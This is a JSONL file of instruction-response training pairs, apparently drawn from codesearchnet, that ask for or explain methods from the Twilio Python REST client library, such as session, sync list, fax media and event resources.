{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncreating a new PhoneNumberInstance", "response": "def create(self, phone_number_sid):\n        \"\"\"\n        Create a new PhoneNumberInstance\n\n        :param unicode phone_number_sid: Phone Number SID for the Phone Number being added to the Service.\n\n        :returns: Newly created PhoneNumberInstance\n        :rtype: twilio.rest.messaging.v1.service.phone_number.PhoneNumberInstance\n        \"\"\"\n        data = values.of({'PhoneNumberSid': phone_number_sid, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return PhoneNumberInstance(self._version, payload, service_sid=self._solution['service_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef get(self):\n        return TaskQueueStatisticsContext(\n            self._version,\n            workspace_sid=self._solution['workspace_sid'],\n            task_queue_sid=self._solution['task_queue_sid'],\n        )", "response": "Constructs a TaskQueueStatisticsContext\n\n        :returns: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_statistics.TaskQueueStatisticsContext\n        :rtype: twilio.rest.taskrouter.v1.workspace.task_queue.task_queue_statistics.TaskQueueStatisticsContext"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_instance(self, payload):\n        return TaskQueueStatisticsInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n            task_queue_sid=self._solution['task_queue_sid'],\n        )", "response": "Build an instance of TaskQueueStatisticsInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _proxy(self):\n        if self._context is None:\n            self._context = TaskQueueStatisticsContext(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                task_queue_sid=self._solution['task_queue_sid'],\n            )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef create(self, unique_name=values.unset, date_expiry=values.unset,\n               ttl=values.unset, mode=values.unset, status=values.unset,\n               participants=values.unset):\n        \"\"\"\n        Create a new SessionInstance\n\n        :param unicode unique_name: An application-defined string that uniquely identifies the resource\n        :param datetime date_expiry: The ISO 8601 date when the Session should expire\n        :param unicode ttl: When the session will expire\n        :param SessionInstance.Mode mode: The Mode of the Session\n        :param SessionInstance.Status status: Session status\n        :param dict participants: The Participant objects to include in the new session\n\n        :returns: Newly created SessionInstance\n        :rtype: twilio.rest.proxy.v1.service.session.SessionInstance\n        \"\"\"\n        data = values.of({\n            'UniqueName': unique_name,\n            'DateExpiry': serialize.iso8601_datetime(date_expiry),\n            'Ttl': ttl,\n            'Mode': mode,\n            'Status': status,\n            'Participants': serialize.map(participants, lambda e: serialize.object(e)),\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return SessionInstance(self._version, payload, service_sid=self._solution['service_sid'], )", "response": "Create a new SessionInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nconstruct a SessionContext :param sid: The unique string that identifies the resource :returns: twilio.rest.proxy.v1.service.session.SessionContext :rtype: twilio.rest.proxy.v1.service.session.SessionContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a SessionContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.proxy.v1.service.session.SessionContext\n        :rtype: twilio.rest.proxy.v1.service.session.SessionContext\n        \"\"\"\n        return SessionContext(self._version, service_sid=self._solution['service_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nbuilding an instance of SessionInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of SessionInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.proxy.v1.service.session.SessionInstance\n        :rtype: twilio.rest.proxy.v1.service.session.SessionInstance\n        \"\"\"\n        return SessionInstance(self._version, payload, service_sid=self._solution['service_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef interactions(self):\n        if self._interactions is None:\n            self._interactions = InteractionList(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                session_sid=self._solution['sid'],\n            )\n        return self._interactions", "response": "Access the interactions\n\n        :returns: twilio.rest.proxy.v1.service.session.interaction.InteractionList\n        :rtype: twilio.rest.proxy.v1.service.session.interaction.InteractionList"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ngenerates an instance context for the resource we are interested in", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: SessionContext for this SessionInstance\n        :rtype: twilio.rest.proxy.v1.service.session.SessionContext\n        \"\"\"\n        if self._context is None:\n            self._context = SessionContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef update(self, date_expiry=values.unset, ttl=values.unset, mode=values.unset,\n               status=values.unset, participants=values.unset):\n        \"\"\"\n        Update the SessionInstance\n\n        :param datetime date_expiry: The ISO 8601 date when the Session should expire\n        :param unicode ttl: When the session will expire\n        :param SessionInstance.Mode mode: The Mode of the Session\n        :param SessionInstance.Status status: The new status of the resource\n        :param dict participants: The Participant objects to include in the session\n\n        :returns: Updated SessionInstance\n        :rtype: twilio.rest.proxy.v1.service.session.SessionInstance\n        \"\"\"\n        return self._proxy.update(\n            date_expiry=date_expiry,\n            ttl=ttl,\n            mode=mode,\n            status=status,\n            participants=participants,\n        )", "response": "Update the SessionInstance with the specified parameters"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\naccesses the CompositionHookList Twilio Domain", "response": "def composition_hooks(self):\n        \"\"\"\n        :rtype: twilio.rest.video.v1.composition_hook.CompositionHookList\n        \"\"\"\n        if self._composition_hooks is None:\n            self._composition_hooks = CompositionHookList(self)\n        return self._composition_hooks"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\naccess the CompositionSettingsList Twilio Domain", "response": "def composition_settings(self):\n        \"\"\"\n        :rtype: twilio.rest.video.v1.composition_settings.CompositionSettingsList\n        \"\"\"\n        if self._composition_settings is None:\n            self._composition_settings = CompositionSettingsList(self)\n        return self._composition_settings"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\naccess the RecordingList Twilio Domain", "response": "def recordings(self):\n        \"\"\"\n        :rtype: twilio.rest.video.v1.recording.RecordingList\n        \"\"\"\n        if self._recordings is None:\n            self._recordings = RecordingList(self)\n        return self._recordings"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\naccess the RecordingSettingsList Twilio Domain", "response": "def recording_settings(self):\n        \"\"\"\n        :rtype: twilio.rest.video.v1.recording_settings.RecordingSettingsList\n        \"\"\"\n        if self._recording_settings is None:\n            self._recording_settings = RecordingSettingsList(self)\n        return self._recording_settings"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef compositions(self):\n        if self._compositions is None:\n            self._compositions = CompositionList(self)\n        return self._compositions", "response": "Access the CompositionList Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef rooms(self):\n        if self._rooms is None:\n            self._rooms = RoomList(self)\n        return self._rooms", "response": "Access the RoomList Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get(self):\n        return WorkflowCumulativeStatisticsContext(\n            self._version,\n            workspace_sid=self._solution['workspace_sid'],\n            workflow_sid=self._solution['workflow_sid'],\n        )", "response": "Constructs a WorkflowCumulativeStatisticsContext\n\n        :returns: twilio.rest.taskrouter.v1.workspace.workflow.workflow_cumulative_statistics.WorkflowCumulativeStatisticsContext\n        :rtype: twilio.rest.taskrouter.v1.workspace.workflow.workflow_cumulative_statistics.WorkflowCumulativeStatisticsContext"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nbuilding an instance of WorkflowCumulativeStatisticsInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of WorkflowCumulativeStatisticsInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.taskrouter.v1.workspace.workflow.workflow_cumulative_statistics.WorkflowCumulativeStatisticsInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.workflow.workflow_cumulative_statistics.WorkflowCumulativeStatisticsInstance\n        \"\"\"\n        return WorkflowCumulativeStatisticsInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n            workflow_sid=self._solution['workflow_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngenerates an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: WorkflowCumulativeStatisticsContext for this WorkflowCumulativeStatisticsInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.workflow.workflow_cumulative_statistics.WorkflowCumulativeStatisticsContext\n        \"\"\"\n        if self._context is None:\n            self._context = WorkflowCumulativeStatisticsContext(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                workflow_sid=self._solution['workflow_sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncreating a new Sync ServiceInstance", "response": "def create(self, friendly_name=values.unset, webhook_url=values.unset,\n               reachability_webhooks_enabled=values.unset,\n               acl_enabled=values.unset):\n        \"\"\"\n        Create a new ServiceInstance\n\n        :param unicode friendly_name: Human-readable name for this service instance\n        :param unicode webhook_url: A URL that will receive event updates when objects are manipulated.\n        :param bool reachability_webhooks_enabled: true or false - controls whether this instance fires webhooks when client endpoints connect to Sync\n        :param bool acl_enabled: true or false - determines whether token identities must be granted access to Sync objects via the Permissions API in this Service.\n\n        :returns: Newly created ServiceInstance\n        :rtype: twilio.rest.sync.v1.service.ServiceInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'WebhookUrl': webhook_url,\n            'ReachabilityWebhooksEnabled': reachability_webhooks_enabled,\n            'AclEnabled': acl_enabled,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ServiceInstance(self._version, payload, )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef update(self, webhook_url=values.unset, friendly_name=values.unset,\n               reachability_webhooks_enabled=values.unset,\n               acl_enabled=values.unset):\n        \"\"\"\n        Update the ServiceInstance\n\n        :param unicode webhook_url: A URL that will receive event updates when objects are manipulated.\n        :param unicode friendly_name: Human-readable name for this service instance\n        :param bool reachability_webhooks_enabled: True or false - controls whether this instance fires webhooks when client endpoints connect to Sync\n        :param bool acl_enabled: true or false - determines whether token identities must be granted access to Sync objects via the Permissions API in this Service.\n\n        :returns: Updated ServiceInstance\n        :rtype: twilio.rest.sync.v1.service.ServiceInstance\n        \"\"\"\n        data = values.of({\n            'WebhookUrl': webhook_url,\n            'FriendlyName': friendly_name,\n            'ReachabilityWebhooksEnabled': reachability_webhooks_enabled,\n            'AclEnabled': acl_enabled,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ServiceInstance(self._version, payload, sid=self._solution['sid'], )", "response": "Update the ServiceInstance\n\n        :param unicode webhook_url: A URL that will receive event updates when objects are manipulated.\n        :param unicode friendly_name: Human-readable name for this service instance\n        :param bool reachability_webhooks_enabled: True or false - controls whether this instance fires webhooks when client endpoints connect to Sync\n        :param bool acl_enabled: true or false - determines whether token identities must be granted access to Sync objects via the Permissions API in this Service.\n\n        :returns: Updated ServiceInstance\n        :rtype: twilio.rest.sync.v1.service.ServiceInstance"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef documents(self):\n        if self._documents is None:\n            self._documents = DocumentList(self._version, service_sid=self._solution['sid'], )\n        return self._documents", "response": "Access the documents\n\n        :returns: twilio.rest.sync.v1.service.document.DocumentList\n        :rtype: twilio.rest.sync.v1.service.document.DocumentList"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\naccesses the sync_lists :returns: twilio.rest.sync.v1.service.sync_list.SyncListList :rtype: twilio.rest.sync.v1.service.sync_list.SyncListList", "response": "def sync_lists(self):\n        \"\"\"\n        Access the sync_lists\n\n        :returns: twilio.rest.sync.v1.service.sync_list.SyncListList\n        :rtype: twilio.rest.sync.v1.service.sync_list.SyncListList\n        \"\"\"\n        if self._sync_lists is None:\n            self._sync_lists = SyncListList(self._version, service_sid=self._solution['sid'], )\n        return self._sync_lists"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\naccess the sync_maps :returns: twilio.rest.sync.v1.service.sync_map.SyncMapList :rtype: twilio.rest.sync.v1.service.sync_map.SyncMapList", "response": "def sync_maps(self):\n        \"\"\"\n        Access the sync_maps\n\n        :returns: twilio.rest.sync.v1.service.sync_map.SyncMapList\n        :rtype: twilio.rest.sync.v1.service.sync_map.SyncMapList\n        \"\"\"\n        if self._sync_maps is None:\n            self._sync_maps = SyncMapList(self._version, service_sid=self._solution['sid'], )\n        return self._sync_maps"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef sync_streams(self):\n        if self._sync_streams is None:\n            self._sync_streams = SyncStreamList(self._version, service_sid=self._solution['sid'], )\n        return self._sync_streams", "response": "Access the sync_streams\n\n        :returns: twilio.rest.sync.v1.service.sync_stream.SyncStreamList\n        :rtype: twilio.rest.sync.v1.service.sync_stream.SyncStreamList"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nupdating the Service Instance s Current Token Identity", "response": "def update(self, webhook_url=values.unset, friendly_name=values.unset,\n               reachability_webhooks_enabled=values.unset,\n               acl_enabled=values.unset):\n        \"\"\"\n        Update the ServiceInstance\n\n        :param unicode webhook_url: A URL that will receive event updates when objects are manipulated.\n        :param unicode friendly_name: Human-readable name for this service instance\n        :param bool reachability_webhooks_enabled: True or false - controls whether this instance fires webhooks when client endpoints connect to Sync\n        :param bool acl_enabled: true or false - determines whether token identities must be granted access to Sync objects via the Permissions API in this Service.\n\n        :returns: Updated ServiceInstance\n        :rtype: twilio.rest.sync.v1.service.ServiceInstance\n        \"\"\"\n        return self._proxy.update(\n            webhook_url=webhook_url,\n            friendly_name=friendly_name,\n            reachability_webhooks_enabled=reachability_webhooks_enabled,\n            acl_enabled=acl_enabled,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get(self, sid):\n        return FaxMediaContext(self._version, fax_sid=self._solution['fax_sid'], sid=sid, )", "response": "Constructs a FaxMediaContext\n\n        :param sid: The unique string that identifies the resource to fetch\n\n        :returns: twilio.rest.fax.v1.fax.fax_media.FaxMediaContext\n        :rtype: twilio.rest.fax.v1.fax.fax_media.FaxMediaContext"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nbuilds an instance of FaxMediaInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of FaxMediaInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.fax.v1.fax.fax_media.FaxMediaInstance\n        :rtype: twilio.rest.fax.v1.fax.fax_media.FaxMediaInstance\n        \"\"\"\n        return FaxMediaInstance(self._version, payload, fax_sid=self._solution['fax_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nfetches a FaxMediaInstance :returns: Fetched FaxMediaInstance :rtype: twilio.rest.fax.v1.fax.fax_media.FaxMediaInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a FaxMediaInstance\n\n        :returns: Fetched FaxMediaInstance\n        :rtype: twilio.rest.fax.v1.fax.fax_media.FaxMediaInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return FaxMediaInstance(\n            self._version,\n            payload,\n            fax_sid=self._solution['fax_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _proxy(self):\n        if self._context is None:\n            self._context = FaxMediaContext(\n                self._version,\n                fax_sid=self._solution['fax_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the fax media instance"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nbuilds an instance of UsageInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of UsageInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.preview.wireless.sim.usage.UsageInstance\n        :rtype: twilio.rest.preview.wireless.sim.usage.UsageInstance\n        \"\"\"\n        return UsageInstance(self._version, payload, sim_sid=self._solution['sim_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef fetch(self, end=values.unset, start=values.unset):\n        params = values.of({'End': end, 'Start': start, })\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return UsageInstance(self._version, payload, sim_sid=self._solution['sim_sid'], )", "response": "Fetch a UsageInstance\n\n        :param unicode end: The end\n        :param unicode start: The start\n\n        :returns: Fetched UsageInstance\n        :rtype: twilio.rest.preview.wireless.sim.usage.UsageInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _proxy(self):\n        if self._context is None:\n            self._context = UsageContext(self._version, sim_sid=self._solution['sim_sid'], )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef fetch(self, end=values.unset, start=values.unset):\n        return self._proxy.fetch(end=end, start=start, )", "response": "Fetch a UsageInstance\n\n        :param unicode end: The end\n        :param unicode start: The start\n\n        :returns: Fetched UsageInstance\n        :rtype: twilio.rest.preview.wireless.sim.usage.UsageInstance"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef stream(self, actor_sid=values.unset, event_type=values.unset,\n               resource_sid=values.unset, source_ip_address=values.unset,\n               start_date=values.unset, end_date=values.unset, limit=None,\n               page_size=None):\n        \"\"\"\n        Streams EventInstance records from the API as a generator stream.\n        This operation lazily loads records as efficiently as possible until the limit\n        is reached.\n        The results are returned as a generator, so this operation is memory efficient.\n\n        :param unicode actor_sid: Only include Events initiated by this Actor\n        :param unicode event_type: Only include Events of this EventType\n        :param unicode resource_sid: Only include Events referring to this resource\n        :param unicode source_ip_address: Only include Events that originated from this IP address\n        :param datetime start_date: Only show events on or after this date\n        :param datetime end_date: Only show events on or before this date\n        :param int limit: Upper limit for the number of records to return. stream()\n                          guarantees to never return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, stream() will attempt to read the\n                              limit with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.monitor.v1.event.EventInstance]\n        \"\"\"\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(\n            actor_sid=actor_sid,\n            event_type=event_type,\n            resource_sid=resource_sid,\n            source_ip_address=source_ip_address,\n            start_date=start_date,\n            end_date=end_date,\n            page_size=limits['page_size'],\n        )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])", "response": "Streams EventInstance records from the API as a generator. This operation lazily loads the records as efficiently as possible until the limit is reached."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef list(self, actor_sid=values.unset, event_type=values.unset,\n             resource_sid=values.unset, source_ip_address=values.unset,\n             start_date=values.unset, end_date=values.unset, limit=None,\n             page_size=None):\n        \"\"\"\n        Lists EventInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param unicode actor_sid: Only include Events initiated by this Actor\n        :param unicode event_type: Only include Events of this EventType\n        :param unicode resource_sid: Only include Events referring to this resource\n        :param unicode source_ip_address: Only include Events that originated from this IP address\n        :param datetime start_date: Only show events on or after this date\n        :param datetime end_date: Only show events on or before this date\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.monitor.v1.event.EventInstance]\n        \"\"\"\n        return list(self.stream(\n            actor_sid=actor_sid,\n            event_type=event_type,\n            resource_sid=resource_sid,\n            source_ip_address=source_ip_address,\n            start_date=start_date,\n            end_date=end_date,\n            limit=limit,\n            page_size=page_size,\n        ))", "response": "Streams EventInstance records from the API as a list."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nretrieving a single page of EventInstance records from the API. Request is executed immediately", "response": "def page(self, actor_sid=values.unset, event_type=values.unset,\n             resource_sid=values.unset, source_ip_address=values.unset,\n             start_date=values.unset, end_date=values.unset,\n             page_token=values.unset, page_number=values.unset,\n             page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of EventInstance records from the API.\n        Request is executed immediately\n\n        :param unicode actor_sid: Only include Events initiated by this Actor\n        :param unicode event_type: Only include Events of this EventType\n        :param unicode resource_sid: Only include Events referring to this resource\n        :param unicode source_ip_address: Only include Events that originated from this IP address\n        :param datetime start_date: Only show events on or after this date\n        :param datetime end_date: Only show events on or before this date\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of EventInstance\n        :rtype: twilio.rest.monitor.v1.event.EventPage\n        \"\"\"\n        params = values.of({\n            'ActorSid': actor_sid,\n            'EventType': event_type,\n            'ResourceSid': resource_sid,\n            'SourceIpAddress': source_ip_address,\n            'StartDate': serialize.iso8601_datetime(start_date),\n            'EndDate': serialize.iso8601_datetime(end_date),\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return EventPage(self._version, response, self._solution)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get(self, call_sid):\n        return MemberContext(\n            self._version,\n            account_sid=self._solution['account_sid'],\n            queue_sid=self._solution['queue_sid'],\n            call_sid=call_sid,\n        )", "response": "Constructs a MemberContext\n\n        :param call_sid: The Call SID of the resource(s) to fetch\n\n        :returns: twilio.rest.api.v2010.account.queue.member.MemberContext\n        :rtype: twilio.rest.api.v2010.account.queue.member.MemberContext"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_instance(self, payload):\n        return MemberInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            queue_sid=self._solution['queue_sid'],\n        )", "response": "Build an instance of MemberInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef fetch(self):\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return MemberInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            queue_sid=self._solution['queue_sid'],\n            call_sid=self._solution['call_sid'],\n        )", "response": "Fetch a MemberInstance\n\n        :returns: Fetched MemberInstance\n        :rtype: twilio.rest.api.v2010.account.queue.member.MemberInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef update(self, url, method):\n        data = values.of({'Url': url, 'Method': method, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return MemberInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            queue_sid=self._solution['queue_sid'],\n            call_sid=self._solution['call_sid'],\n        )", "response": "Update the MemberInstance\n\n        :param unicode url: The absolute URL of the Queue resource\n        :param unicode method: How to pass the update request data\n\n        :returns: Updated MemberInstance\n        :rtype: twilio.rest.api.v2010.account.queue.member.MemberInstance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngenerating an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: MemberContext for this MemberInstance\n        :rtype: twilio.rest.api.v2010.account.queue.member.MemberContext\n        \"\"\"\n        if self._context is None:\n            self._context = MemberContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                queue_sid=self._solution['queue_sid'],\n                call_sid=self._solution['call_sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef page(self, status=values.unset, date_created_after=values.unset,\n             date_created_before=values.unset, room_sid=values.unset,\n             page_token=values.unset, page_number=values.unset,\n             page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of CompositionInstance records from the API.\n        Request is executed immediately\n\n        :param CompositionInstance.Status status: Only show Compositions with the given status.\n        :param datetime date_created_after: Only show Compositions created on or after this ISO8601 date-time with timezone.\n        :param datetime date_created_before: Only show Compositions created before this ISO8601 date-time with timezone.\n        :param unicode room_sid: Only show Compositions with the given Room SID.\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of CompositionInstance\n        :rtype: twilio.rest.video.v1.composition.CompositionPage\n        \"\"\"\n        params = values.of({\n            'Status': status,\n            'DateCreatedAfter': serialize.iso8601_datetime(date_created_after),\n            'DateCreatedBefore': serialize.iso8601_datetime(date_created_before),\n            'RoomSid': room_sid,\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return CompositionPage(self._version, response, self._solution)", "response": "Retrieve a single page of CompositionInstance records from the API. Request is executed immediately"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _proxy(self):\n        if self._context is None:\n            self._context = CompositionContext(self._version, sid=self._solution['sid'], )\n        return self._context", "response": "Generate an instance context for the object"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\ncreating a new SyncListInstance", "response": "def create(self, unique_name=values.unset, ttl=values.unset,\n               collection_ttl=values.unset):\n        \"\"\"\n        Create a new SyncListInstance\n\n        :param unicode unique_name: Human-readable name for this list\n        :param unicode ttl: Alias for collection_ttl\n        :param unicode collection_ttl: Time-to-live of this List in seconds, defaults to no expiration.\n\n        :returns: Newly created SyncListInstance\n        :rtype: twilio.rest.sync.v1.service.sync_list.SyncListInstance\n        \"\"\"\n        data = values.of({'UniqueName': unique_name, 'Ttl': ttl, 'CollectionTtl': collection_ttl, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return SyncListInstance(self._version, payload, service_sid=self._solution['service_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nretrieves a single page of SyncListInstance records from the API. Request is executed immediately", "response": "def page(self, page_token=values.unset, page_number=values.unset,\n             page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of SyncListInstance records from the API.\n        Request is executed immediately\n\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of SyncListInstance\n        :rtype: twilio.rest.sync.v1.service.sync_list.SyncListPage\n        \"\"\"\n        params = values.of({'PageToken': page_token, 'Page': page_number, 'PageSize': page_size, })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return SyncListPage(self._version, response, self._solution)"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nretrieves a specific page of SyncListInstance records from the API. Request is executed immediately", "response": "def get_page(self, target_url):\n        \"\"\"\n        Retrieve a specific page of SyncListInstance records from the API.\n        Request is executed immediately\n\n        :param str target_url: API-generated URL for the requested results page\n\n        :returns: Page of SyncListInstance\n        :rtype: twilio.rest.sync.v1.service.sync_list.SyncListPage\n        \"\"\"\n        response = self._version.domain.twilio.request(\n            'GET',\n            target_url,\n        )\n\n        return SyncListPage(self._version, response, self._solution)"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nconstructs a SyncListContext :param sid: The sid :returns: twilio.rest.sync.v1.service.sync_list.SyncListContext :rtype: twilio.rest.sync.v1.service.sync_list.SyncListContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a SyncListContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.sync.v1.service.sync_list.SyncListContext\n        :rtype: twilio.rest.sync.v1.service.sync_list.SyncListContext\n        \"\"\"\n        return SyncListContext(self._version, service_sid=self._solution['service_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nbuild an instance of SyncListInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of SyncListInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.sync.v1.service.sync_list.SyncListInstance\n        :rtype: twilio.rest.sync.v1.service.sync_list.SyncListInstance\n        \"\"\"\n        return SyncListInstance(self._version, payload, service_sid=self._solution['service_sid'], )"}
